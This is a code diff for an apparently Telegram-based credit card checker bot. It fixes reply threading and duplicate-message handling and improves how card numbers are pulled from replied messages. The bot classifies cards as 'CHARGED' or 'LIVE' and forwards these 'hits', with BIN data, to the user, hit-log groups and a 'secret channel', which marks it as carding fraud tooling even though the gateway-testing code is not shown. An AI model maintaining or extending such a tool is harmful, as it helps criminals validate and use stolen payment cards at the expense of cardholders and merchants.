@@ -118,7 +118,7 @@ PRO_EMOJI_ID      = "6280484433027931563"
 DECLINED_EMOJI_ID = "4956612582816351459"
 
 # Hit-log emojis
-HIT_GATE_EMOJI_ID = "5341715473882955310"
+HIT_GATE_EMOJI_ID = "5462902520215002477"
 HIT_RESP_EMOJI_ID = "5839116473951328489"
 
 # Progress-message emojis
@@ -1148,7 +1148,8 @@ async def _send_sticker(bot, chat_id, emoji_id: str):
 
 async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
                           parse_mode: str = "HTML", reply_markup=None,
-                          disable_notification: bool = False):
+                          disable_notification: bool = False,
+                          reply_to_message_id: int = None):
     """Send a hit notification with a premium custom emoji sticker header.
 
     Embeds emoji_id as a standalone <tg-emoji> tag on the first line so it
@@ -1168,6 +1169,7 @@ async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
             parse_mode=parse_mode, reply_markup=reply_markup,
             disable_web_page_preview=True,
             disable_notification=disable_notification,
+            reply_to_message_id=reply_to_message_id,
         )
     except Exception as exc:
         logging.warning(f"[MEDIA] send_message to {chat_id} failed: {exc}")
@@ -1637,10 +1639,13 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
 async def _send_hit(bot, user, text: str, verdict: str,
                     card: str = "", bin_data: dict = None,
                     price: str = "0.00", currency: str = "USD",
-                    plan: str = "TRIAL", resp: str = ""):
+                    plan: str = "TRIAL", resp: str = "",
+                    skip_dm: bool = False):
     """Send hit notifications to DM, hit-log group, extra charged group, and secret channel.
     `text` = full result card HTML (used as DM caption).
-    Each destination gets ONE message: animated sticker + card as caption."""
+    Each destination gets ONE message: animated sticker + card as caption.
+    Set skip_dm=True when the result was already sent to the chat (e.g. from cmd_sh)
+    to prevent the same card appearing twice in a private chat."""
     bin_data  = bin_data or {}
     eid       = get_random_charged_emoji() if verdict == "CHARGED" else get_random_live_emoji()
     ulink     = _user_link(user)
@@ -1684,10 +1689,13 @@ async def _send_hit(bot, user, text: str, verdict: str,
     ]])
 
     # ── 1. DM — animation + full result card as caption ───────────────────────
-    try:
-        await _send_as_media(bot, user.id, eid, caption=text, parse_mode="HTML")
-    except Exception as e:
-        logging.warning(f"[HIT] DM uid={user.id}: {e}")
+    # skip_dm=True when cmd_sh already sent the result to the chat (avoids
+    # sending the same card twice when the user is checking in a private chat).
+    if not skip_dm:
+        try:
+            await _send_as_media(bot, user.id, eid, caption=text, parse_mode="HTML")
+        except Exception as e:
+            logging.warning(f"[HIT] DM uid={user.id}: {e}")
 
     # ── 2. Hit-log group — animation + compact card ───────────────────────────
     if HIT_LOG_GROUP_ID:
@@ -1968,9 +1976,17 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.args:
         card = context.args[0].strip()
     elif update.message.reply_to_message:
+        # FIX: use extract_cards() so the card can be anywhere in the replied
+        # message text (not just the very first word).
         txt = (update.message.reply_to_message.text or
                update.message.reply_to_message.caption or "").strip()
-        if txt: card = txt.split()[0]
+        if txt:
+            _found = extract_cards(txt)
+            if _found:
+                card = _found[0]
+            elif "|" in txt:
+                # fallback: first token that contains a pipe
+                card = next((t for t in txt.split() if "|" in t), None)
 
     if not card or "|" not in card:
         await update.message.reply_text(
@@ -2066,14 +2082,19 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         pass
 
+    # FIX 1: reply to the original command message so result is threaded correctly.
+    # FIX 2: skip_dm=True so _send_hit doesn't also send to user.id — that would
+    #         produce two identical cards in any private chat.
     await _send_as_media(context.bot, update.effective_chat.id, _cmd_eid,
-                         caption=res_html, parse_mode="HTML", reply_markup=kb)
+                         caption=res_html, parse_mode="HTML", reply_markup=kb,
+                         reply_to_message_id=update.message.message_id)
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
         asyncio.create_task(_send_hit(
             context.bot, user, res_html, verdict,
             card=card, bin_data=bin_data, price=price, currency=currency,
             plan=plan, resp=resp,
+            skip_dm=True,   # result already sent to chat above — no duplicate DM
         ))
 
 
